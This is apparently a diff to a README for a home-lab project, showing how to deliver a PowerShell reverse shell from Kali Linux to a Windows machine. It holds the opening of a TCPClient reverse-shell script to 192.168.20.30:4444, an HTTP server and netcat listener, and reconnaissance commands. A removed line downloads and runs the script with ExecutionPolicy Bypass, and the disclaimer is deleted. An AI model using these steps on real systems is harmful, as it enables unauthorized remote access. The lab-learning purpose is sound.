@@ -21,7 +21,7 @@ This project demonstrates how to create and deploy a malicious PowerShell script
 
 ### 1. **Create Malicious PowerShell Payload**
 
-Firstly, I created a malicious PowerShell script (`malicious.ps1`) that establishes a reverse shell back to my Kali's machine, based on this [git](https://github.com/das-lab/mpsd) and [forum](https://learn.microsoft.com/en-us/defender-endpoint/run-detection-test?source=recommendations&view=o365-worldwide):
+Firstly, I created a malicious PowerShell script (`malicious.ps1`) that establishes a reverse shell back to my Kali's machine, based on this [git](https://github.com/das-lab/mpsd) and [post](https://learn.microsoft.com/en-us/defender-endpoint/run-detection-test?source=recommendations&view=o365-worldwide):
 
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient("192.168.20.30", 4444)
@@ -56,41 +56,21 @@ $client.Close()
 
 ### 2. **Set Up HTTP Server to Serve Payload**
 
-Once the payload script was created, the attacker needed to serve it to the victim machine. This was done by using a simple HTTP server on Kali Linux to host the malicious script:
-
+Once the payload script was created, I hosted an HTTP web server just to simulate the Windows user to download malware through a link. Meanwhile I used Netcat to listen for an incoming connection from the reverse shell:
 ```bash
 python3 -m http.server 80
 ```
-
-This command starts a web server on port `80` of Kali Linux, making the malicious script accessible to the victim.
-
-### 3. **Start Listener on Kali Linux**
-
-Next, the attacker needs to listen for an incoming connection from the reverse shell. This was done using Netcat (`nc`) on Kali Linux:
-
 ```bash
 nc -lvnp 4444
 ```
 
-This command listens on port `4444` and waits for a connection from the victim’s machine once the reverse shell script is executed.
-
 ### 4. **Victim Downloads and Executes the Malicious Payload**
 
-The attacker then used the following PowerShell command to force the victim to download and execute the malicious payload:
+After the Windows user has downloaded and executed the malicious payload,it bypasses the PowerShell execution policy and downloads the malicious script from the attacker’s web server to the target machine. Once executed, the script initiates the reverse shell and connects back to my kali’s machine.
 
-```powershell
-powershell -ExecutionPolicy Bypass -File "http://192.168.20.30/malicious.ps1"
-```
+### 5. **Execute Commands on the Target Machine**
 
-This command bypasses the PowerShell execution policy and downloads the malicious script from the attacker’s web server to the target machine. Once executed, the script initiates the reverse shell and connects back to the attacker’s machine.
-
-### 5. **Gaining Access to the Windows Workstation**
-
-Once the malicious PowerShell script was executed on the victim’s machine, the reverse shell successfully connected to the attacker’s machine. The attacker now had remote access to the Windows workstation and could run commands on it.
-
-### 6. **Execute Commands on the Target Machine**
-
-After establishing the reverse shell, the attacker could run various commands to gather information about the system. Some useful commands executed during the attack include:
+After successfully establishing the reverse shell, I could run every command that i wanted to on that Windows machine or gather information about the system. Some useful commands executed during the attack include:
 
 - **`whoami`** – To confirm the user currently logged in:
   ```bash
@@ -112,18 +92,7 @@ After establishing the reverse shell, the attacker could run various commands to
   net user labadmin
   ```
 
-These commands helped the attacker confirm the identity of the user, gather information about the system, and identify potential targets for further exploitation.
 
-## Conclusion
 
-In this project, the attacker:
-
-1. **Created Malware**: A malicious PowerShell script (`malicious.ps1`) that establishes a reverse shell backdoor.
-2. **Made the Victim Download the Malware**: The attacker used a simple HTTP server to serve the payload and a PowerShell command to make the victim download and execute the script.
-3. **Gained Access to the Windows Workstation**: The reverse shell connected back to the attacker’s machine, giving them full remote control over the victim’s system.
-
-With this access, the attacker could now run arbitrary commands, escalate privileges, maintain persistence, and continue exploiting the system.
-
-## Disclaimer
-
-This project is intended for educational purposes only. It demonstrates a common attack technique used in penetration testing to simulate how an attacker might gain remote access to a target system. Unauthorized access to computer systems is illegal and unethical. Always ensure you have explicit permission before conducting any form of penetration testing or attack simulation.
+Pfsense rules...
+CrowdSec ruless...
